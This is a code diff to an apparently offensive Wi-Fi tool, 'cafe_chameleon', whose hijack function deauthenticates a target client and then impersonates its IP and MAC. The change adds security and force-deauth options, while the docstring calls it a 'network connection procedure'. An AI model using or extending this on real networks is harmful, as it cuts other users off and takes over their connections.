@@ -17,7 +17,21 @@ from cafe_chameleon.network.deauth import send_deauth
 from cafe_chameleon.network.internet import has_internet, test_internet_speed
 
 
-def hijack(interface: str, ip: str, mac: str, netmask: str, broadcast: str, gateway: str, max_retries: int = 2, timeout_per_retry: float = 4, profile: str | None = None, bssid: str | None = None, channel: int | None = None) -> bool:
+def hijack(
+    interface: str,
+    ip: str,
+    mac: str,
+    netmask: str,
+    broadcast: str,
+    gateway: str,
+    max_retries: int = 2,
+    timeout_per_retry: float = 4,
+    profile: str | None = None,
+    bssid: str | None = None,
+    channel: int | None = None,
+    security: str | None = None,
+    force_deauth: bool = False
+) -> bool:
     """
     High-reliability network connection procedure with streamlined status reporting.
     """
@@ -27,7 +41,7 @@ def hijack(interface: str, ip: str, mac: str, netmask: str, broadcast: str, gate
     active_profile = profile or get_active_profile()
 
     try:
-        send_deauth(mac, bssid, interface, channel=channel)
+        send_deauth(mac, bssid, interface, channel=channel, security=security, force_deauth=force_deauth)
 
         for attempt in range(1, max_retries + 1):
             set_hijack_status(ip=ip, technique="Host Impersonation Sweep", clear_section2=True)
